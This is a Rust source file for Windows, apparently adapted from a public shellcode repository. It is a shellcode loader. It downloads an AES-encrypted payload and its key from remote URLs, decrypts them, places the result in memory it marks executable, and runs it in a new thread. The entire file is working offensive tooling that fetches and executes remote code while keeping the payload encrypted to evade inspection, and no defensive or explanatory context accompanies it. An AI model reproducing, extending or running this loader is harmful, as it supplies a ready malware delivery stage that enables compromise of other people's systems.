// Gemini Cyber Security + https://github.com/b1nhack/rust-shellcode/blob/main/create_thread/src/main.rs

extern crate aes;
extern crate block_modes;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;

use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::env;
use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const IV_SIZE: usize = 16;  // AES block size

fn main() -> std::io::Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        eprintln!("Usage: ./rust -exec <http://ip_address//encrypted> <http://ip_address//key> ");

        std::process::exit(1);
    }

    match args[1].as_str() {
	"-exec" => {
	    if args.len() != 4 {
		eprintln!("Please provide the right arguments.");
		std::process::exit(1);
	    }

            match unsafe { execute_decrypt(&args[2], &args[3]) } {
                Ok(_) => {
                    println!("Decryption and execution succeeded.");
                    Ok(())  // Returning Result<(), std::io::Error>
                }
                Err(e) => {
                    eprintln!("Error: {}", e);
                    Err(std::io::Error::new(std::io::ErrorKind::Other, e)) // Converting String to std::io::Error
                }
            }
        },

	_ => {
           eprintln!("Invalid option");
           eprintln!("Usage: ./rust -exec <http://ip_address//encrypted> <http://ip_address//key> ");
           std::process::exit(1);
        }
    }
}

fn fetch_file_from_url(url: &str) -> Result<Vec<u8>, reqwest::Error> {
    let response = reqwest::blocking::get(url)?;
    let content = response.bytes()?;
    Ok(content.to_vec())
}

unsafe fn execute_decrypt(input_filename: &str, key_filename: &str) -> Result<(), String> {

    let key = fetch_file_from_url(key_filename).unwrap();
    let encrypted_data = fetch_file_from_url(input_filename).unwrap();

    let iv = vec![0u8; IV_SIZE];

    let cipher = Aes256Cbc::new_from_slices(&key, &iv).unwrap();
    let decrypted_data = cipher.decrypt_vec(&encrypted_data).unwrap();

    let shellcode_size = decrypted_data.len();

    unsafe {
        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VAlloc failed: {}!", GetLastError());
        }

        copy(decrypted_data.as_ptr(), addr.cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VProtect failed: {}!", GetLastError());
        }

        let addr = transmute(addr);
        let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
        if thread == 0 {
            panic!("[-]CThread failed: {}!", GetLastError());
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
    Ok(())
}

